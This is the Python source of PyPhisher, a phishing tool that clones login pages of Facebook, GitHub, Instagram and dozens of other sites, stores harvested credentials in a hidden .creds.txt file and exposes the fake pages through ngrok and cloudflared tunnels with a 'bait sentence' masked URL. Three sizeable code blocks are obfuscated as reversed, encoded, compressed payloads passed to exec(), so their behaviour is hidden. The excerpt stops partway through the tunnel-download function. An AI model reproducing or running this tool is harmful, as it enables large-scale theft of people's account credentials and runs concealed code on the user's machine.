# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 1.9
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish, AdvPhishing
# Env        : #!/usr/bin/env python

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""


_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'AD1C0C4EF1BEBE3E1EDF8A012CD89627107D136614DEDED3BDC3E6C1BCC64F11D3CC83F0B0E9B379091F699E698EF2FF8DDEE07DEDDCFE56C2EDB5D114B7727587FA56C5B9B3249C0B05EC20BDD160AD7F1A77ED50AB39F880F17373A3EB1E264FDDE7B2B3EE47E7EBF211B75B89D17FDA99E5B583D8B56032D9E63F8E0EF7169F812FEEE92B3B14AA739D00E0842D7C227E7DD7070B2C9E451456BECBC8628E077C7AB4986AAB5D88515D14D5BA233F79138BD518171A76BBAB48D3D60582A54C9E3FA47CC8ED262C643C0B7DB726DE64D5A8DA60F479BD12C274CDB1898CA8D3EE62B5A762690EBD024FC91863118684143483FEF4D60AC9A8D6639683B39C8D0B95A3F9ACAFFDD17C1A5A93A0BCE04BBABA3C69B49745268B3DE43A105BBAA9E904CEF64C9600455E0B9DDB90E0DF4253D1F4F30058A2251733F3F697A841655F5E0FB049BF2979288AC3D08455AD616BF60D8CF44AF5E57B152148448940FA329659FAE40F6502663CAC0B03BC1EEE2E5A9EA3BBA0A7E24249093CA2B74F453748A5E9DD7AA247B175D7D2E3185533F067F5D523282098D8078528A3C1EE48B13CF61ADC8440DD828738587EEA105F158A08CEE97FC903FEB908CBF7F7E3EBFBF9F9F3FEFD7F3D4E28F21858CF12A4FBE17827D220D8C7A12D2DDC764639F834C01385E69429D1C987'))

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.9"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo=f'''
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |                          {cyan}[v{version}]
{cyan}        |___/                   {red}[By KasRoudra]
'''

modules = [ "requests", "bs4" ]
tunnelers = [ "ngrok", "cloudflared", "loclx" ]
processes = [ "php", "ngrok", "cloudflared", "loclx", "localxpose" ]

try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

root = popen("cd $HOME && pwd").read().strip()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        import_module(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            system(f"pip3 install {module}")
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        import_module(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from requests import get, Session
from bs4 import BeautifulSoup

websites_url = f"https://github.com/KasRoudra/PyPhisher/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 

websites_dir = f"{root}/.websites"
dir_templates = f"{websites_dir}/templates.json"
templates_file = dir_templates if isfile(dir_templates) else "files/templates.json"
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
email = ""
password = ""
receiver = ""
mask = ""

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux = True
    saved_file = "/sdcard/.creds.txt"
    try:
        if not isfile(saved_file):
            mknod(saved_file)
        with open(saved_file) as checkfile:
            data = checkfile.read()
    except:
        system("termux-setup-storage")
else:
    termux = False
    saved_file = f"{root}/.creds.txt"


# Check if sudo is allowed
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo = True
else:
    sudo = False

# Check if it is mac and if tunnelers are installed
if system("command -v brew > /dev/null 2>&1")==0:
    brew = True
    if system("command -v ngrok > /dev/null 2>&1")==0:
        ngrok = True
    else:
        ngrok = False
    if system("command -v cloudflared > /dev/null 2>&1")==0:
        cloudflared = True
    else:
        cloudflared = False
    if system("command -v localxpose > /dev/null 2>&1")==0:
        loclx = True
    else:
        loclx = False
else:
    brew = False
    ngrok = False
    cloudflared = False
    loclx = False
   

print(f"\n{info}Please wait!\n")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===6V6AZI5PK767P7YSZSXGQYKHMXKV3XTVA2TXLT6ZKVPEU2NGDIIAS2TA57NCIK62MY6SAQWNA5ZB2QTG5SIKBZHO6R7ZRT3C5MQHLZY77PY3VW74YYRXLFSHFLGL4EYBDTKCPYANFA423M5RR5LRREKHWAXD7GXS2Z4ZO6TCAZC34YSTYIGLYNS7GXPFRHK32S4PRGAFELTGBO7DKA64HSJ5PQMSIBIHDYLSYH437UHB2F26DJYHZ242ADHDSD3GODQ7GO6AP6RTF4FAQEBSSXIKEGAVFPXOMR5TUQVE24YHFHYM6XBSRTX2BRC5BIDV6KD7QCBVFAJQSRXGPNXPX6QYACFVXFCL6XMCMQQPDJGUTU4H7S6WUVBC46MAQZF372C27SZ6URK6EQJEANB4DOATNOOUI2XENVJIEYHS6WAR4BEVP7B6O76LZC3TDIOR5BPNLW6CBBJU7CC4YSSHQT66LIIVWPFMC5AVPKY622OVPRL6MHX3O4ZOM3EGVPYSAKBIYSRJTCYSDTTRIXVMGAKAXTAFMDZTWCPQQUPFFNMHQ6XBAGVCXSI6UM52TWXSF7STSNXQ25PNIQ6QG6S56CC2AHSQ3WYVL2A5URAYLXKACBOQ56CGUNOQU7A3PISYIGY25FXVMLTNJIDZGWJNNPUWWE4XLK3RTVPLD7OX6RZRDBSZCL5LO2DQWDER323A6F6QDKA5PCXBAPDCXQJ2VNDCJAOAEJQKKA7N7SBPVOQSVTXJZGTAAR7MS6A3TIUMMT6CYR2EK2BPWPGJCE2MTLAMRZ647RFU5N7P7O2WS4ILX56JQ6V3557S5JPZJX7BBNYJZC763ALC27ZD55OFWVW4BMISCLT5R4ENOUGQ2APVWRRGRAEPXIEBNMHURDB7H6TAXKHUR5DSIF5MVWAZPACXDXROOIRMI6CDAALVB76CA2W22YST3XVDPOXEGJUXVIG7FKUCQMDYOQJHKFLJRWANV7DPEN5QORCNCSU2TEACNYLBXFVDSXHPFPBPQYZ5A5ICLSKIXYXHZC3GUVPQY7FA626YNFIXKADMIDBBZVG5PL4Q2HDUESKVNTEHFFL2K5MXC2AY6CURIKEAXKQ5G4JCRDVJXP6LDHTR53LN4EGOJ3RSPQTPOPW52WZ3XLGIIGS4S7OOHIADJZS67CUMJIPBSV6I672IK66FIQ2DWOEEMR2BF3ANQYCPFEDCBZ5X4Y63BW7FPO4UGFRZHTY3WC7B7I5DQ63S2GQLSBHVX5ZZUNC6MIA6YCGLN2OAPA3LHWU4RBYX43B6NJ46SL5BFDCUSY4CUOSBD6QHB4Y54GQ7QBHF4ZDD7M2RZAGBBQLLV2WNORFHHYJEDBX7YHDYXPZCA7WZCJMIKBA6FG5KA5M2KZME4LJOTWDPSXQUNDRZ4OXOVIR7EWX4MXVQQ7637I2BMDVNCGXFW3FWF6HI7TDHU2KMEMOFW7KJIHR4HYWM65PBKGO6NZ4BJEWR4Z4DCHG2CQZBPZCSDKZCIHSWIQIPLJYN2XAMI3QEE4HJTEBI2KRTQKEO4ZJZIZ4YRSGK52SNNYLAZCJK7GG5F6TFS3QQSPNYHRHPJA3YVJSQCLCPSLTCMCC734ZWXYH2IQTACJAY5DE65IIJ4GZ75P5YXL5CU4V34HI7ELCRVY6OHAUIQKXQXUF76Q7INHQB7QHTOTRWQAUDBGIQ4ORD2FRBICDACREKK42H5QS3P3SBNVLLB4UJ4EHDVC5HJ7GIK3YLWTOFQOXEXXEVFL3XA4KSS3AVYKWNHWGM7RPX7MVADIJNHHS5TEUUCK72SC7JDCUFIPNYILQSF5O6GECV3ZVH7ZHGQVWRK6W766VBN2FHUO3J5DQOPRHRO2ODSJF2MA5WJD75MKGHUOUZKMR2IOY74HIOIZHTRRA6VJRFOMQ4FG3CRM4B2DPDLAA5E3OG4R56ZECVOYE3FAKYFHMOKVABPXNXRFP2DA2QLLDNPQHTNICWOB4APTEGVP2NNVON5BPPIEJK55TRLRLLSU2W4YLIJH4PTASWONT2POPYOPXTIFE53BQSGFVGVXATUDID2DA5WNMNYVU6ZL2P3FH2EBOYFADNVALTOKJUEQ2NOGDT75DXBA33IWA2K4SAUUBUD2YMGVVJZAXBWRPWFJPD7DOJOCR6VATYT7HIUAWA63OZYAV44XB6IVMZLM23VDC55CLLY6YVT3AJ2SBSIQQCCLAJYYYPILC3BAA5TLOZLN3X5F74VD45XXMA5EOPMMIWG26D4PCM6NDNVIXM5BDNKSS3PYJ45TW6Q3AH4DN3MDJXOGV6UGUGHFULM5UOU4JJFMOJR4AXSF55PIHPQQ2MIY6QPCEJJH42RUPHE7KR4GDP74NUJD2ED3FZ5WVPTWKBTWWZYFRCRWHMOKDYXZIXXAJYBFKY65NDDKRW657EFBJL2QZGIBVYM73VS4LE245ANXPD2OLAZNH6NGC7GWPFXI5LEAXNDCT4332U7652G7ITL22PU2V3ID2FLYRVHPSTFZQGVVXVXEJIPFPMQLFAUDPCI6SMSUDLUXOO4CXMPRV3YDPUJ7WZ5U7DTULB3ZRJ2DYW5CMPXZVHIHMGI5YEPH3QKQSM4UFSKXFIQKUPROSQSRAG7GD2IUSF2TN3VOP7AEPPA3XMQAYOMHKDVAXVTIKDCM32PTUWZ2DCMXY5ZH22PCFPYAU755U2WWG5OHJ6UYLH3VP7CU2VPKK5NC6NA2UQZAOQRZN6NDRPKYHREKY5DUM5EBCZX5TRP2W2NMMTKG44K3JQ3N2LWSOP5EESQL7Z7DCNDPB352TAJFQRBB4ENQADJIE7C2LDA2PSTCL73W2ZIUPQOSDORRA7ORTX3OQUGMDYMXJFXPHYUGFNVQWCYDRQOMDEXCLFKW6HRUODLPLARGE35OBVAGFBW24ZFSL4BZB255ZOCEWRXZJBOO7S65P5E34BBJ54MZTTZOIP5XSDX4SZQI3Z3PBEMCGQFIU76Q5WIOGPE2B7AWNYLOMDZ2RBXYDAINMQ2KIUDMPQTQ4RQCQZYRCCSCK4GSMOHADA7WZSPYIJAEUZ25QG5KTXQJK7JMQLYA4SLGEPJTOYHE7FFCJCOFBOVJCQYEWTXM42AFBYBSSC73YE3RJFC2TABZA5I7UZ6EKYUACMERZGIYRAJN66NIBV4GPK2VHNPO7VTMHGBCAC6RQGOTDI7EF3D52OMPHCTHS4HWERA2Y5N5NX6GT5S6AELRCBZJIBHUFB4OBCA7PN2BB7KBHDCPYDDMQ5HBZQ7DTN7FV76B6G3FZIVYZZYIQS5RYBSS3R6GECG5UXBZT3CWL42GBS74YYZPSPXZS7QOGZJTEIAPNR4IZ5B74Y6O7O35FV2CWPJ5HTZFZHYCSBAT64JFOTIX2GNMLAX4MK7RTAE5O7237OXKCSUOGI4JTXD5K5Q6RQJTHO4KQEH332VNBNMJYBMWZEWBQGLPO27CQ6FIL22DMSWFEUVD3C5YM5HTMFRUHFHRDIM7H32ZXFIC5OE7FQHARNBVAE4NTUDKFO5UU6O56X5LK42K6AKOMCY526Z4435ZKK2ETREUA7HSPPNCJW2E6ZJZXXOCGCGDSGRNBWRQL43U4ITS7TK5GE4IG5OISI7YMSLEIAVNDTFCSSCCHAUJWUL56YGXW7X23GAH6NSGZV2TG3LH2CQ7K7GUUODEKHC5C5WB7ZKDBCVCBVPHQH3HMVC6SJWRAZFMP3SN7A442Z3TF7WYU3USBL3CJH4OQEJ7FOR5OT4QPMH6BIBAGRWME5G3MB3KQ3GX46AXYYUV3TBJFTH3PNMLSRCZFB4W6LQZO4IVGG5UDXWUL3DYHMC245LEYEOOK5PQ3NGKOXHNRNQMDZWNPLRWGZTGGLYV4RUECNMQMDOS22X2I44JX5G42ZTOVRNOIBZG3BB7VHLL4NEMWI3ZSB7OJE7ZYSTBLBF44GKOS2YYK6ISEQ4B3KP7X5NRHQJVSLNUVAKJRWUJNSKHLJLJ2V32QN43MZDXV5AXXETFOCMWGPPU2C37EVO6SSF7HRM4KVTKLZJEDEBBM7QJ7CLTQPPJ6F4FUHWBGTTV267SKSEFJ7QZ4U7SQEQTTEZOCNXTAZURB7UBEGC4RX6TMI35RTM376BTNSO276QYIEXCHMAORINWCHWXN5AQI4NTMSL64PGQWWRDPXJZIA3YMVO7QFL5V44BBOH7LPXDDSTF7CPG2AZUFQVD5ZJOASWXHRLLXSD6IFY5FAUGELWQYWIY4N5D2BQH5FDIICCQU3YPTXSH2S6KZ4GU57PDY6DVQGIZUKDMRIXX33U5BY6FF5DB43DSBWQIE24NOUV2X2FSGUCAAR6FGHSG65ZXSIGS2SC44O2ADESPU5362C4W5P6VD7JAK4OL6WV3SPWGPKUOQK552RHCPGPQ4SPRTMCN56VJ725YA3GYDPVLX3LIEO3EXG7C6GPZZSFF3IT3PAI7T46EO22LN5LW3ZO6CT4RQF55GVFKHUOB7CMBYARJAAWKUVWBE4YSUPGC4SOHBHYIFAMKO66WIX6HZLK7XUFOMQNICSHJSPVO4DDD7RHB7N3QG2SP2ANMYMF533OQAARB66VAIOIWOLV3JW3CV4SCKGH5HMPX3N72Q4K6TFEQF62YFR5KO5JMY7JF3PFSZLPVBS55BHEE6IMHISHCSY7DWUYU3EQFUXKP5NS64Y2O5ZC2V53G5FTLUEHAZIT2BUFOXVNUZ4LF4DQSQZ7F7MGMJFE2UMXHZRC2I2FOXW75W3IU23LVW6YU2DTZT5K34BARTPVCVG7BWFVE6ASDEDMTCM2DHKE7MPYXJ7NTNZ5HEMXXGBXKEQWGOVRBDWIXOGNVKCKLZNVRY5FKUW2VSNKY7MYEFOF6YOTKODWZJYRSTSBF7BPZER3X6WRZCUKYNOJMXJCTTYN5NJANM4JK43GHYCJMPJ6BDZEMYZHF65ATYBLEPCXIHWPLEPDO5X4RPH7ANQNG7HDTO4FSCGAU6FEJ53H4ZXYSDHWF2JLEUXJK4UG4HTGDL4J3B5D7ITRB7GGLINK2N2KCXZHQVQLT6SJIOVGPNART25PE72SEYZNFLZO3KMSNTR5VAA2DSFQ5IJOEEEB3C4RTI3B4SUSJ5X7AHTZCTURGME724A3ONRZ533L7UCX7VHA72GFJKCMV7LP5IIKPU2AQVLTB2CX6XSFKEMTRW35JHC72R6XV25OEBT7YD2PRMHSJ2TEZJHCS74C7L63FON4UP2RGGOVLQJDW3EVVKIJLBNHLI6AIPNVOQF6EA42NCEJUNQUVNHAAYGXMRQ6IBGX24CNVCZN4KS3SYTZ5URTTOFT5IO6MXIRECTE3QYJNAKPZHYMYGAOD72LVOZXAGUHAA3JPH2TZZCM6XQZCPOBXKLEYIGHFJNSLBN6WMG326GHLFZ4BKUKFDD53ZLTXEFFWMDHON2AXRSZ3WJUQSV22RZ4YU4N7K2WFQSNFO5TCWXYN3MLNZZFLDXDU42I6GLZZXOJIZSE3N6OKZ6ZHAEKBMGSPD2JXKDKQCJ7YVQTYDUNTNXXKVYO76HIR5JXEGBMMGYOTFSEMRK3WIMUXHO3VATQRSKR6CLO57MBG7TWUXQP5WEBLFI2J4I2ZLC6C7LWH6ZVLSUJILGJDSOAX6YN6KLRE32YNYLBWBYK6QS4J3PIX5QUYZCZNVTZEQBLWS2XXMNX7AXJ3I4DMVVZXVWPDZUZ4ABOTTI4OSQIQRNKITHKRUDCZLDJRLUFU4O7HVR6LOHUCZOHH5B73KZW3VFDWP4ZF4E3XCQX32ROQRQCOAQAAMVDFK4NT3GZU4PPQGHQZESLJ2PXQOFF2VJP3BMFC6OALML3TWQNIGKBPIEW6MH66SSSDTWFCYY5L6YJF65NV2J467B5APXIDVZYLDYK6WBUWDWDRMJ5DCJZF2OVVNFBWZI6C36WOZNI2HTLBEO4R6NW5WLRMZWVSXDVSX6TK6HKVKG5FE67NLHE3CJTLSLXZFXUIPNTWE67K4WU6YKSDKJLPXO6OJLJZ56RSBHPGYNP7ZRLSJ3L2XFWNYAPJKK5NRS5IJM6LH3ABN2LLLQX3HKYUYZWCV7D4Q4HVN7S3JJCT3R2JCCM2WS72NYOZVGPSX6GIZGR5V4IRKPJ4DRR6Z3ABM3EHFJRYV4E7MVBVTLZHZ6QZQ47K56JVJW2PSYORMM4FLRFT6ZBMWXWKRZPGGIPY5V2C7KQ6GO2XWUOPQKBLXDFJM5Z7ES7N42XQKHGPYXGRXNSHDGWDXZJ5ETLAHYHE73YGFGLFBAFPSWBV3KTH77IQRGI4FJYYVWNZ2RK5R6DTMMTZLI3IYA5SNTXV4QWH65ENZKZUXI2SV557R64TVFLFL5MRGFNUDV2EJB3FXLGTBF7L3EGRYKVC6ZBFW3WFUUJ7ZFKBT6RN53LPMYREYXTZ5G46TODO3TUWHAGGU6I5RY3FPRPV4BB5TKEPNTS7KWFKPWMS7RLR3EZYO65Q3VIZCZT2PVPRXTQZ5GSUCLCDSSOD3SA56VUF64HWMTXCMAVES5XMZJZBF55ZMJ3JJSYT4ETS34ZH6WFJG6OY7EP7DN23WKTN6LGWN23SGS62X5ZVGMDISYYJYJM6JO5SVWKYI5FNLCN5KJZVQVC3TXKERSTZ3ENC56ADLOEDBT4WTDFHJKS22BLNLXEQTVP6EETK2SXMGSWOUPTQTIRT7CT6NDEEB4GF4CWX3LTLLOGIU6PMZKXH2UISL55WJKK3KS52UGS4PH4DLLPTGIGUELE64LZIV5JZJCUPEY73DX777P625T777P6ZZ3777HV7Y2XGLC6T4LVDRIPPW45P4AV3OQQRCMJQA24ARYAAQ4CVUR3CS2R5JEMLSLWJKW2BOCP'))

# Write/Append errors to error file
def write_error(e):
    with open(error_file, "a") as error_log:
        error_log.write(str(e)+"\n")

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages
def installer():
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman"]:
        # Check if package manager is present but php isn't present
        if system(f"command -v {pacman} > /dev/null 2>&1")==0:
            if system("command -v php > /dev/null 2>&1")!=0:
                sprint(f"\n{info}Installing PHP{nc}")
                if pacman=="pacman":
                    system(f"sudo {pacman} -S php")
                elif pacman=="apk":
                    system(f"sudo {pacman} add php")
                elif sudo:
                    system(f"sudo {pacman} install -y php")
                else:
                    system(f"{pacman} install -y php")
                break


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if system(f"pidof {process} > /dev/null 2>&1")==0:
            system(f"killall {process}")



# Set up ngrok authtoken to work with ngrok links
def ngrok_token():
    while not isfile(f"{root}/.config/ngrok/ngrok.yml"):
        token = input(f"\n{ask}Enter your ngrok authtoken (write 'help' for instructions): {green}")
        if token!="":
            if token=="help":
                sprint(ngrok_help, 0.01)
                sleep(3)
            else:
                system(f"cd $HOME/.tunneler && ./ngrok config add-authtoken {token}")
                break
        else:
            print(f"\n{error}No authtoken!")
            sleep(1)
            break

def saved():
    system("clear")
    sprint(logo, 0.01)
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        main()

# Info about tool
def about():
    system("clear")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[PyPhisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[KasRoudra] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/KasRoudra] ")
    print(f"{red}[Messenger] {cyan} :[https://m.me/KasRoudra] ")
    print(f"{red}[Email]     {cyan} :[kasroudrakrd@gmail.com] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        main()
        

# Copy website files from custom location
def customfol():
    global mask
    fol = input(f"\n{ask}Enter the directory > {green}")
    mask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    # Remove slash and spaces from mask
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html") :
            system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server()
        else:
            sprint(f"{error}index.php/index.html required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# Update of PyPhisher
def updater():
    internet()
    if not exists("files/pyphisher.gif"):
        return
    try:
        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
    except Exception as e:
        write_error(e)
        git_ver = version
    if git_ver != "404: Not Found" and float(git_ver) > float(version):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        system("clear")
        print(logo)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# First function main

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'6teFk9h///7z5rmXvhUlsjuzH/S6+Jcpk3LLLBoPherwYSiE/UumtpbwhHs/60dbIxvfT6joY0GhqtagaqkDvMQlKir01/5vEzsyuRipgvM2buijZWiaGNcJtuklDElp5x6QPJz2LbNV/MzLCmMUnNXVvm06bKGCjFPyULt+5rrZrDcFXK2TkiEo/iV9j4pDAPHM+J1dREwBGCSke7FfJlWL+nkPdGr+GHdReqQyGvzpDNye53vIBx/i12UVisCs7Xrh03RVXjJUkmJqfuPEyBPuB6Xrbj80HtMTqtrIZWrl7Sxrxc14M+os+q4PquTUmF4FicYTmoDuQfh2z17OYSueyHA2y+KIQmPgOKzRhuWKYRAQxtibBXkvzqqfbTXlZUTqD1bt3l/XqTGkK+FeiDiHKRohngpxuTIU5hJY7FOa4KL5DG71cIT6ZwOlBjiIUYOJ5pLFvVqGQCbqHci1+tOMSO+B3VFSZ8jIIP/iEX3vgz5QlbHPvVKQ9ms+LEI14K19+VHnGc4PYkjVc14Z3pD778th04YN3qGfXJeWu4obW7CwteZGp8eNDaq0Yp0NIzorJXEvkSSVEQMeXXhZo1dyaLSyVhu67/2UfE1QtwOnB1wBP/KO5++YSi/Wp+iqgcE45WOxAFzbVmY9/un5kN6gTn86z2usaD9QkXX6GV9u+7y+cnR0hJA5yf41yURxUVarUM49Jy5O7cpFqpp25t84+P9P8qd3SuAKduc534DoPO02UEaCBgmQMz7pTwYrV3aMa/2yaIGPnd8srUiooepcBrjaGI81fQ7/OiQK35FhV087edO5835u9k/i/9CcpVo0K4IxLa0YUjuAxJJETgzO3kZjvpcN+wFhq3IuDHphpuDQXk6/GXm9bOTgxaAVtqMdbLYee3gPEnvxBl/TPltCe7iSDRVyMDFPcfjrkccI4+Ko4MGUjLq5izx4PACBMNE2oHiU7tvUvDfCYrqT0d81JYzfQKsDHNC0mpUpqC1y2ap3ALLfLnKh1o0vqu0bK7bdJiug5CizFXyX3+0rtSwZ+lONZ/8FafApbJ29OtBtxvR5rC8pgUpPvWXGPpmRw0MhFt/J2haBmKAu0OVPmgUBur6ZX9zo+5HhfD6rlxaE11SZsDXLdV7oCaXjaQH9bVzKdNQBMPgTqHLJdMq3xpAxbK/dT2CDKubUXAZatkjXEA1TTfnkXXoLkwpTtFnvzIe0vHX1RKMF7dCoXVh+wEI1llr/iqhbN7lqJsowRXBGmV6aiXOutg4viN6o5MF8ebNMWbtuML2Wz9bVuwIMsfXJHofBY8mAYUnzEk8aLPaaGXQysvTFFyo7svqdlSKqOHJHzR0CH716q5SkaeKntkXux+0eLqTHJA/S/3Wq2rq6yfPe+yojgEh3YhIJ5fiUGfcx95YVMrLUhYE4Xt66TS4pz9kw/wOot4ZFeLGGhlD+NX/j77/fy/3vfnP/+zyuK3n865lf+yRLxBnFkdLcnCA6k0CALed6PHNQCgFrWUL1NwJe'))

# 2nd function installing packages and downloading tunnelers
def prerequiments():
    global is_mail_ok, email, password, receiver
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing proot{nc}")
            system("pkg install proot -y")
    installer()
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
        exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system
    architecture = osinfo.machine
    if not exists(f"{root}/.tunneler"):
        mkdir(f"{root}/.tunneler")
    isngrok = isfile(f"{root}/.tunneler/ngrok")
    iscloudflared = isfile(f"{root}/.tunneler/cloudflared")
    isloclx = isfile(f"{root}/.tunneler/loclx")
    if brew:
        if not ngrok:
            system("brew install ngrok/ngrok/ngrok")
        if not cloudflared:
            system("brew install cloudflare/cloudflare/cloudflared")
        if not loclx:
            system("brew install localxpose")
    else:
        system("rm -rf ngrok.zip ngrok.tgz cloudflared.tgz cloudflared loclx.zip")
        internet()
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
                if not iscloudflared:
                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{root}/.tunneler/cloudflared")
                if not isloclx:
                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
            elif architecture.find("arm")!=-1:
                if not isngrok:
                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
                if not iscloudflared:
